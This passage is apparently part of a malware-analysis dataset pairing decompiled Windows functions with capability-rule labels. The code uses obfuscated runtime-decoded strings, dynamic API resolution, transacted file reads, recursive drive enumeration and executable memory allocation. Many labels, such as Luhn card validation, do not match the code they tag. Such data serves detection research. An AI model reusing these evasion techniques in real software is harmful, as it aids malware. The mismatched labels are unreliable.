uStack219;\n    uchar uStack218;\n    uchar uStack217;\n    uchar uStack216;\n    uchar uStack215;\n    uchar uStack214;\n    uchar uStack213;\n    uchar uStack212;\n    uchar uStack211;\n    uchar uStack210;\n    uchar uStack209;\n    uchar uStack208;\n    uchar uStack207;\n    uchar uStack206;\n    uchar uStack205;\n    uchar uStack204;\n    uchar uStack200;\n    uchar uStack199;\n    uchar uStack198;\n    uchar uStack197;\n    uchar uStack196;\n    uchar uStack195;\n    uchar uStack194;\n    uchar uStack193;\n    uchar uStack192;\n    uchar uStack191;\n    uchar uStack190;\n    uchar uStack189;\n    uchar uStack188;\n    uchar uStack187;\n    uchar uStack186;\n    uchar uStack185;\n    uchar uStack184;\n    uchar uStack183;\n    uchar uStack182;\n    uchar uStack181;\n    uchar uStack180;\n    uchar uStack179;\n    uchar uStack178;\n    uchar uStack177;\n    uchar uStack176;\n    uchar uStack175;\n    uchar uStack174;\n    uchar uStack173;\n    uchar uStack172;\n    uchar uStack171;\n    uchar uStack170;\n    uchar uStack169;\n    uchar uStack168;\n    uchar uStack167;\n    uchar uStack160;\n    uchar uStack159;\n    uchar uStack158;\n    uchar uStack157;\n    uchar uStack156;\n    uchar uStack155;\n    uchar uStack154;\n    uchar uStack153;\n    uchar uStack152;\n    uchar uStack151;\n    uchar uStack150;\n    uchar uStack149;\n    uchar uStack148;\n    uchar uStack147;\n    uchar uStack146;\n    uchar uStack145;\n    uchar uStack144;\n    uchar uStack143;\n    uchar uStack142;\n    uchar uStack141;\n    uchar uStack140;\n    uchar uStack139;\n    uchar uStack138;\n    uchar uStack137;\n    uchar uStack136;\n    uchar uStack135;\n    uchar uStack134;\n    uchar uStack133;\n    uchar uStack132;\n    uchar uStack131;\n    uchar uStack130;\n    uchar uStack129;\n    uchar uStack128;\n    uchar uStack127;\n    uchar uStack126;\n    uchar uStack120;\n    uchar uStack119;\n    uchar uStack118;\n    uchar uStack117;\n    uchar uStack116;\n    uchar uStack115;\n    uchar uStack114;\n    uchar uStack113;\n    uchar uStack112;\n    uchar uStack111;\n    uchar uStack110;\n    uchar uStack109;\n    uchar uStack108;\n    uchar uStack107;\n    uchar uStack106;\n    uchar uStack105;\n    uchar uStack104;\n    uchar uStack103;\n    uchar uStack102;\n    uchar uStack101;\n    uchar uStack100;\n    uchar uStack99;\n    uchar uStack98;\n    uchar uStack97;\n    uchar uStack96;\n    uchar uStack95;\n    uchar uStack94;\n    uchar uStack93;\n    uchar uStack92;\n    uchar uStack91;\n    uchar uStack90;\n    uchar uStack89;\n    uchar uStack88;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    uchar uStack77;\n    uchar uStack76;\n    uchar uStack75;\n    uchar uStack74;\n    uchar uStack73;\n    uchar uStack72;\n    uchar uStack71;\n    uchar uStack70;\n    uchar uStack69;\n    uchar uStack68;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack57;\n    uchar uStack56;\n    uchar uStack55;\n    uchar uStack54;\n    uchar uStack53;\n    uchar uStack52;\n    uchar uStack51;\n    uchar uStack50;\n    uchar uStack49;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uchar uStack45;\n    uchar uStack44;\n    uchar uStack43;\n    uchar uStack42;\n    uchar uStack41;\n    uchar uStack40;\n    uchar uStack39;\n    uchar uStack38;\n    uchar uStack37;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    ulong uStack32;\n    uint32_t *puStack24;\n    ulong uStack16;\n    \n    uStack80 = 0xfb;\n    uStack79 = 0xfc;\n    uStack78 = 0xfe;\n    uStack77 = 0xff;\n    uStack76 = 0xaa;\n    uStack75 = 0x44;\n    uStack74 = 0x3c;\n    uStack73 = 0x5f;\n    uStack72 = 0x5b;\n    uStack71 = 0x6e;\n    uStack70 = 0x74;\n    uStack69 = 0x6b;\n    uStack68 = 0x77;\n    uStack67 = 0x80;\n    uStack66 = 0x7d;\n    uStack65 = 0x67;\n    uStack64 = 0x5f;\n    uStack63 = 0x86;\n    uStack62 = 0x81;\n    uStack61 = 0x83;\n    uStack60 = 0x75;\n    uStack59 = 0x7e;\n    uStack58 = 0x45;\n    uStack57 = 0x45;\n    uStack56 = 0x70;\n    uStack55 = 0x80;\n    uStack54 = 0x7b;\n    uStack53 = 0x89;\n    uStack52 = 0x86;\n    uStack51 = 0x7e;\n    uStack50 = 0x86;\n    uStack49 = 0x4e;\n    uStack48 = 0x4e;\n    uStack47 = 0x4b;\n    uStack46 = 0x82;\n    uStack45 = 0x8b;\n    uStack44 = 0x8c;\n    uStack43 = 0;\n    uStack42 = 7;\n    uStack41 = 0x6d;\n    uStack40 = 0x4f;\n    uStack39 = 0x72;\n    uStack38 = 0x78;\n    uStack37 = 0x78;\n    uStack36 = 0x78;\n    uStack35 = 0x78;\n    uStack34 = 0;\n    arg1 = fcn.140006a6c(&uStack80);\n    uStack16 = fcn.1400012cc(arg1);\n    puStack24 = fcn.140002958(uStack16);\n    uStack32 = fcn.140001260(*(puStack24 + 2), *puStack24);\n    uStack296 = 0xfb;\n    uStack295 = 0xfc;\n    uStack294 = 0xfe;\n    uStack293 = 0xff;\n    uStack292 = 0xaa;\n    uStack291 = 0x4d;\n    uStack290 = 0x71;\n    uStack289 = 100;\n    uStack288 = 0x68;\n    uStack287 = 0x51;\n    uStack286 = 0x6f;\n    uStack285 = 0x69;\n    uStack284 = 0x7a;\n    uStack283 = 0x6a;\n    uStack282 = 0x7c;\n    uStack281 = 0x84;\n    uStack280 = 99;\n    uStack279 = 0;\n    uStack278 = 7;\n    uStack277 = 0x6d;\n    uStack276 = 0x4f;\n    uStack275 = 0x72;\n    uStack274 = 0x78;\n    uStack273 = 0x78;\n    uStack272 = 0x78;\n    uStack271 = 0x78;\n    uStack270 = 0;\n    fcn.140006a6c(&uStack296);\n    uStack120 = 0xfb;\n    uStack119 = 0xfc;\n    uStack118 = 0xfe;\n    uStack117 = 0xff;\n    uStack116 = 0xaa;\n    uStack115 = 0x48;\n    uStack114 = 0x67;\n    uStack113 = 0x77;\n    uStack112 = 0x47;\n    uStack111 = 0x74;\n    uStack110 = 0x73;\n    uStack109 = 0x77;\n    uStack108 = 0x7d;\n    uStack107 = 0x7d;\n    uStack106 = 0x6f;\n    uStack105 = 0x7d;\n    uStack104 = 0x5a;\n    uStack103 = 0x6e;\n    uStack102 = 0x7b;\n    uStack101 = 0x74;\n    uStack100 = 0x55;\n    uStack99 = 0x89;\n    uStack98 = 0x53;\n    uStack97 = 0;\n    uStack96 = 7;\n    uStack95 = 0x6d;\n    uStack94 = 0x4f;\n    uStack93 = 0x72;\n    uStack92 = 0x78;\n    uStack91 = 0x78;\n    uStack90 = 0x78;\n    uStack89 = 0x78;\n    uStack88 = 0;\n    fcn.140006a6c(&uStack120);\n    uStack160 = 0xfb;\n    uStack159 = 0xfc;\n    uStack158 = 0xfe;\n    uStack157 = 0xff;\n    uStack156 = 0xaa;\n    uStack155 = 0x48;\n    uStack154 = 0x6e;\n    uStack153 = 0x72;\n    uStack152 = 0x66;\n    uStack151 = 0x66;\n    uStack150 = 0x72;\n    uStack149 = 0x54;\n    uStack148 = 0x6d;\n    uStack147 = 0x76;\n    uStack146 = 0x79;\n    uStack145 = 0x7d;\n    uStack144 = 0x85;\n    uStack143 = 0x60;\n    uStack142 = 0x82;\n    uStack141 = 0x70;\n    uStack140 = 0x84;\n    uStack139 = 0x86;\n    uStack138 = 0x85;\n    uStack137 = 0x58;\n    uStack136 = 0x8c;\n    uStack135 = 0;\n    uStack134 = 7;\n    uStack133 = 0x6d;\n    uStack132 = 0x4f;\n    uStack131 = 0x72;\n    uStack130 = 0x78;\n    uStack129 = 0x78;\n    uStack128 = 0x78;\n    uStack127 = 0x78;\n    uStack126 = 0;\n    fcn.140006a6c(&uStack160);\n    uStack200 = 0xfb;\n    uStack199 = 0xfc;\n    uStack198 = 0xfe;\n    uStack197 = 0xff;\n    uStack196 = 0xaa;\n    uStack195 = 0x48;\n    uStack194 = 0x67;\n    uStack193 = 0x77;\n    uStack192 = 0x48;\n    uStack191 = 0x6e;\n    uStack190 = 0x79;\n    uStack189 = 0x72;\n    uStack188 = 0x4e;\n    uStack187 = 0x7b;\n    uStack186 = 0x6f;\n    uStack185 = 0x70;\n    uStack184 = 0x5f;\n    uStack183 = 0x7d;\n    uStack182 = 0x6f;\n    uStack181 = 0x72;\n    uStack180 = 0x75;\n    uStack179 = 0x56;\n    uStack178 = 0x8a;\n    uStack177 = 0x54;\n    uStack176 = 0;\n    uStack175 = 7;\n    uStack174 = 0x6d;\n    uStack173 = 0x4f;\n    uStack172 = 0x72;\n    uStack171 = 0x78;\n    uStack170 = 0x78;\n    uStack169 = 0x78;\n    uStack168 = 0x78;\n    uStack167 = 0;\n    fcn.140006a6c(&uStack200);\n    uStack232 = 0xfb;\n    uStack231 = 0xfc;\n    uStack230 = 0xfe;\n    uStack229 = 0xff;\n    uStack228 = 0xaa;\n    uStack227 = 0x48;\n    uStack226 = 0x67;\n    uStack225 = 0x77;\n    uStack224 = 0x54;\n    uStack223 = 0x77;\n    uStack222 = 0x75;\n    uStack221 = 0x6b;\n    uStack220 = 0x7d;\n    uStack219 = 0x6c;\n    uStack218 = 0x7e;\n    uStack217 = 0x54;\n    uStack216 = 0x7a;\n    uStack215 = 0x73;\n    uStack214 = 0x7d;\n    uStack213 = 0;\n    uStack212 = 7;\n    uStack211 = 0x6d;\n    uStack210 = 0x4f;\n    uStack209 = 0x72;\n    uStack208 = 0x78;\n    uStack207 = 0x78;\n    uStack206 = 0x78;\n    uStack205 = 0x78;\n    uStack204 = 0;\n    fcn.140006a6c(&uStack232);\n    uStack264 = 0xfb;\n    uStack263 = 0xfc;\n    uStack262 = 0xfe;\n    uStack261 = 0xff;\n    uStack260 = 0xaa;\n    uStack259 = 0x48;\n    uStack258 = 0x67;\n    uStack257 = 0x77;\n    uStack256 = 0x5a;\n    uStack255 = 0x6a;\n    uStack254 = 0x78;\n    uStack253 = 0x7a;\n    uStack252 = 0x71;\n    uStack251 = 0x78;\n    uStack250 = 0x78;\n    uStack249 = 0x50;\n    uStack248 = 0x84;\n    uStack247 = 0x4e;\n    uStack246 = 0;\n    uStack245 = 7;\n    uStack244 = 0x6d;\n    uStack243 = 0x4f;\n    uStack242 = 0x72;\n    uStack241 = 0x78;\n    uStack240 = 0x78;\n    uStack239 = 0x78;\n    uStack238 = 0x78;\n    uStack237 = 0;\n    fcn.140006a6c(&uStack264);\n    *0x14000a9c0 = fcn.140004358(uStack32, &uStack296);\n    *0x14000aa28 = fcn.140004358(uStack32, &uStack160);\n    *0x14000aa18 = fcn.140004358(uStack32, &uStack200);\n    *0x14000aa08 = fcn.140004358(uStack32, &uStack232);\n    *0x14000aa78 = fcn.140004358(uStack32, &uStack264);\n    return 1;\n}\n",
        "token_count": 4032
    },
    "1400041e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint * fcn.1400041ec(void)\n\n{\n    uint *puVar1;\n    uint auStack176 [2];\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    \n    puVar1 = fcn.140006604(0x10, 0x3000, 0x40);\n    fcn.140002470(&uStack168, 0, 0x9c);\n    uStack168 = 0x9c;\n    (**0x14000aa78)();\n    (**0x14000aa08)(uStack164, uStack160, 0, 0, auStack176);\n    *puVar1 = uStack164;\n    puVar1[1] = uStack160;\n    puVar1[2] = uStack156;\n    puVar1[3] = auStack176[0];\n    return puVar1;\n}\n",
        "token_count": 203
    },
    "14000624": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nulong fcn.14000624c(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uStack40;\n    \n    uStack40 = 0;\n    while( true ) {\n        if (5 < uStack40) {\n            return 0;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*(uStack40 * 8 + 0x14000a148));\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(arg1 + (iVar2 - iVar1) * 2, *(uStack40 * 8 + 0x14000a148));\n        if (iVar1 == 0) break;\n        uStack40 = uStack40 + 1;\n    }\n    return 1;\n}\n",
        "token_count": 195
    },
    "140006a6": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nuchar * fcn.140006a6c(uchar *arg1)\n\n{\n    uint8_t uVar1;\n    uint32_t uStack276;\n    char acStack264 [264];\n    \n    fcn.140002470(acStack264, 0, 0x100);\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg1);\n    uStack276 = 0;\n    do {\n        if (uVar1 <= uStack276) {\ncode_r0x000140006b1e:\n            acStack264[uVar1] = '\\0';\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(arg1, acStack264);\n            return arg1;\n        }\n        if (arg1[uStack276 + 5] == '\\0') {\n            *arg1 = 0;\n            goto code_r0x000140006b1e;\n        }\n        acStack264[uStack276] = (arg1[uStack276 + 5] - uStack276) + -1;\n        uStack276 = uStack276 + 1;\n    } while( true );\n}\n",
        "token_count": 242
    },
    "14000103": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000103c(void)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    uint64_t uStack32;\n    \n    iVar2 = fcn.140006604(400, 0x3000, 0x40);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsW)(100);\n    for (uStack32 = 0; uStack32 <= uVar1 / 2 + 2; uStack32 = uStack32 + 4) {\n        fcn.140003c54(iVar2 + uStack32 * 2);\n    }\n    return iVar2;\n}\n",
        "token_count": 146
    },
    "14000122": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140001220(void)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    uint auStack72 [2];\n    uint64_t uStack64;\n    \n    puVar2 = auStack72;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    auStack72[0] = 0x40;\n    (**0x14000aa28)(auStack72);\n    return uStack64 / 0x40000000;\n}\n",
        "token_count": 143
    },
    "14000126": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140001260(ulong arg1, ulong arg2)\n\n{\n    fcn.140001d0c(arg1, arg2, 0x140004134, 0x14000317c);\n    return;\n}\n",
        "token_count": 52
    },
    "1400012c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400012cc(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    uint64_t uStack40;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg1);\n    uVar1 = iVar2 * 2 + 2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3, 8, uVar1);\n    for (uStack40 = 0; uStack40 < uVar1 / 2; uStack40 = uStack40 + 1) {\n        *(iVar4 + uStack40 * 2) = *(arg1 + uStack40);\n    }\n    return iVar4;\n}\n",
        "token_count": 194
    },
    "14000136": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140001368(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint uStack24;\n    uint uStack20;\n    ulong uStack16;\n    \n    uStack20 = 0x100;\n    uStack16 = fcn.140006604(0x100, 0x3000, 0x40);\n    uStack24 = 0x100;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetComputerNameExA)(arg1, uStack16, &uStack24);\n    if (iVar1 == 0) {\n        uStack16 = 0;\n    }\n    return uStack16;\n}\n",
        "token_count": 144
    },
    "14000144": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.14000144c(uchar *arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    uchar auStack56 [8];\n    uint uStack48;\n    ulong uStack40;\n    \n    uVar1 = fcn.140006d70(*(arg2 + 8), arg2);\n    uStack40 = fcn.140006604(uVar1, 0x3000, 0x40);\n    uStack48 = fcn.140006dc4(*(arg2 + 0x10), *(arg2 + 8), uStack40);\n    puVar3 = auStack56;\n    puVar4 = arg1;\n    for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 240
    },
    "140001c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140001c80(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg1);\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(arg1 + (iVar1 + -1) * 2, 0x140008344);\n    if (uVar2 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg1);\n        if (uVar2 != 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg1);\n            uVar2 = iVar1 + -1;\n            *(arg1 + uVar2 * 2) = *0x140008358;\n        }\n    }\n    return uVar2 & 0xffffffffffffff00;\n}\n",
        "token_count": 200
    },
    "14000260": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140002604(char *arg1)\n\n{\n    char *pcStack24;\n    \n    for (pcStack24 = arg1; *pcStack24 != '\\0'; pcStack24 = pcStack24 + 1) {\n    }\n    return pcStack24 - arg1;\n}\n",
        "token_count": 66
    },
    "1400028f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400028f8(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg1);\n    uVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(arg1 + (iVar1 + -1) * 2, 0x140008344);\n    if (uVar2 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg1);\n        if (uVar2 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_lstrcatW)(arg1, 0x140008344);\n        }\n    }\n    return uVar2 & 0xffffffffffffff00;\n}\n",
        "token_count": 179
    },
    "14000295": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.140002958(ulong arg1)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    ulong in_stack_ffffffffffffff88;\n    uint uVar5;\n    ulong uVar4;\n    ulong in_stack_ffffffffffffff98;\n    uint32_t uVar6;\n    ulong in_stack_ffffffffffffffa0;\n    uint32_t uVar7;\n    uint32_t uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint32_t *puStack56;\n    int64_t iStack48;\n    int64_t iStack40;\n    code *pcStack32;\n    ulong auStack24 [3];\n    \n    uVar6 = in_stack_ffffffffffffff98 >> 0x20;\n    uVar7 = in_stack_ffffffffffffffa0 >> 0x20;\n    uVar5 = in_stack_ffffffffffffff88 >> 0x20;\n    uStack68 = 0x800000;\n    iStack48 = 0xffffffffffffffff;\n    uStack72 = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    uVar4 = CONCAT44(uVar5, 0x40);\n    iStack40 = (*_sym.imp.KERNEL32.dll_VirtualAllocExNuma)(uVar3, 0, 0x800000, 0x3000, uVar4, 0);\n    uVar5 = uVar4 >> 0x20;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    puStack56 = (*_sym.imp.KERNEL32.dll_VirtualAllocExNuma)(uVar3, 0, 0x18, 0x3000, CONCAT44(uVar5, 0x40), 0);\n    *(puStack56 + 4) = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"ntdll\");\n    pcStack32 = fcn.140002e3c(uVar3, \"NtCreateTransaction\");\n    uVar5 = 0;\n    uStack64 = (*pcStack32)(auStack24, 0x1f003f, 0, 0, 0, 0, uVar6 << 0x20, uVar7 << 0x20, 0, 0);\n    iStack48 = (*_sym.imp.KERNEL32.dll_CreateFileTransactedW)\n                         (arg1, 0x80000000, 1, 0, CONCAT44(uVar5, 3), 1, 0, auStack24[0], 0, 0);\n    if (iStack48 == -1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        *(puStack56 + 4) = uVar1;\n    }\n    else {\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iStack48, iStack40 + *puStack56, 0x800000, &uStack72, 0);\n            if (iVar2 == 0) {\n                *puStack56 = *puStack56 + uStack72;\n            }\n        } while (uStack72 == 0x800000);\n        *puStack56 = uStack72;\n        *(puStack56 + 2) = iStack40;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack48);\n        if (iVar2 == 0) {\n            *(puStack56 + 4) = 7;\n        }\n    }\n    return puStack56;\n}\n",
        "token_count": 793
    },
    "140002b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140002b6c(ulong arg1)\n\n{\n    int32_t iStack20;\n    \n    iStack20 = fcn.140002604(arg1);\n    if (0x7f17 < iStack20) {\n        iStack20 = 0x7f17;\n    }\n    return iStack20;\n}\n",
        "token_count": 76
    },
    "140002bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140002bc8(ulong arg1, ulong arg2)\n\n{\n    (*_sym.imp.USER32.dll_wsprintfW)(arg1, 0x140008348, arg1, arg2, 0x140008344);\n    return;\n}\n",
        "token_count": 58
    },
    "140002c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "contain loop"
        ],
        "decompiled_code": "\nbool fcn.140002c04(int64_t *arg1)\n\n{\n    int64_t arg2;\n    int32_t iVar1;\n    uint64_t uVar2;\n    uint64_t arg1_00;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int32_t iStack88;\n    int64_t iStack80;\n    uint64_t uStack40;\n    uint64_t uStack32;\n    int64_t iStack24;\n    uint32_t uStack16;\n    uint uStack12;\n    \n    arg2 = *arg1 + 0x18 + *(*arg1 + 0x14);\n    uVar2 = *(*arg1 + 0x30) & 0xffffffff00000000;\n    uStack40 = *(arg2 + 8) | uVar2;\n    uStack32 = fcn.140004800(uStack40, *(arg1 + 0xd));\n    iStack24 = fcn.1400061e4(arg1, arg2);\n    uStack16 = *(arg2 + 0x24);\n    uStack12 = 0;\n    iStack88 = 1;\n    do {\n        iStack80 = arg2 + 0x28;\n        if (*(*arg1 + 6) <= iStack88) {\n            uStack12 = 1;\n            iVar1 = fcn.140006014(arg1, &uStack40);\n            return iVar1 != 0;\n        }\n        arg1_00 = *(arg2 + 0x30) | uVar2;\n        uVar3 = fcn.140004800(arg1_00, *(arg1 + 0xd));\n        iVar4 = fcn.1400061e4(arg1, iStack80);\n        if ((uStack32 == uVar3) || (uVar3 < uStack40 + iStack24)) {\n            if (((*(arg2 + 0x4c) & 0x2000000) == 0) || ((uStack16 & 0x2000000) == 0)) {\n                uStack16 = (uStack16 | *(arg2 + 0x4c)) & 0xfdffffff;\n            }\n            else {\n                uStack16 = uStack16 | *(arg2 + 0x4c);\n            }\n            iStack24 = (arg1_00 + iVar4) - uStack40;\n        }\n        else {\n            iVar1 = fcn.140006014(arg1, &uStack40);\n            if (iVar1 == 0) {\n                return false;\n            }\n            uStack16 = *(arg2 + 0x4c);\n            uStack40 = arg1_00;\n            uStack32 = uVar3;\n            iStack24 = iVar4;\n        }\n        iStack88 = iStack88 + 1;\n        arg2 = iStack80;\n    } while( true );\n}\n",
        "token_count": 632
    },
    "14000314": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140003140(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(arg1, arg2);\n    fcn.1400040d8(arg1, arg3);\n    return arg1;\n}\n",
        "token_count": 63
    },
    "14000336": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14000336c(int64_t arg1, int64_t arg2)\n\n{\n    return arg1 + arg2;\n}\n",
        "token_count": 33
    },
    "140003c5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140003c54(ulong arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t *puStack48;\n    ulong uStack40;\n    ulong uStack32;\n    int64_t iStack24;\n    \n    uStack40 = fcn.140006604(8, 0x3000, 0x40);\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(uStack40, arg1);\n    fcn.1400028f8(uStack40);\n    puStack48 = fcn.140006604(0x250, 0x3000, 0x40);\n    uStack32 = fcn.140006604(0x208, 0x3000, 0x40);\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(uStack32, uStack40);\n    iStack24 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(uStack32, puStack48);\n    if (iStack24 != -1) {\n        do {\n            cVar1 = fcn.140005340(puStack48 + 0xb);\n            if (cVar1 != '\\0') {\n                iVar2 = fcn.140004824(*puStack48);\n                if (iVar2 == 0) {\n                    cVar1 = fcn.14000624c(puStack48 + 0xb);\n                    if ((cVar1 != '\\0') && (iVar2 = fcn.1400065c8(iStack24),  iVar2 != 0)) {\n                        (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(uStack40);\n                        (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(0x14000835c);\n                        fcn.140004a3c(uStack40, puStack48 + 0xb);\n                    }\n                }\n                else {\n                    fcn.140001c80(uStack40);\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(uStack32, uStack40);\n                    fcn.140002bc8(uStack32, puStack48 + 0xb);\n                    fcn.140003c54(uStack32);\n                }\n            }\n            iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iStack24, puStack48);\n        } while (iVar2 != 0);\n        (*_sym.imp.KERNEL32.dll_FindClose)(iStack24);\n    }\n    fcn.14000428c(&puStack48, 0x250);\n    fcn.14000428c(&uStack32, 0x208);\n    return 0;\n}\n",
        "token_count": 574
    },
    "1400040d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400040d8(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    ulong in_R8;\n    ulong in_R9;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrcatA)(arg1, 0x1400082d4);\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrcatA)(arg1, arg2, in_R8, in_R9, uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrcatA)(arg1, 0x1400082d8, in_R8, in_R9, uVar1);\n    return uVar1;\n}\n",
        "token_count": 154
    },
    "14000416": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14000416c(int64_t arg1, uint64_t arg2)\n\n{\n    uint64_t uStack40;\n    uint64_t uStack32;\n    \n    uStack32 = 0;\n    for (uStack40 = 0; uStack40 < arg2; uStack40 = uStack40 + 1) {\n        uStack32 = *((uStack32 & 0xff ^ *(arg1 + uStack40)) * 8 + 0x14000a1a0) ^ uStack32 >> 8;\n    }\n    return uStack32;\n}\n",
        "token_count": 131
    },
    "14000428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.14000428c(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint64_t auStack24 [3];\n    \n    auStack24[0] = arg2;\n    iVar1 = (**0x14000a9e0)(0xffffffffffffffff, arg1, auStack24, 0x8000);\n    return iVar1 == 0;\n}\n",
        "token_count": 88
    },
    "1400042d": {
        "rules": [
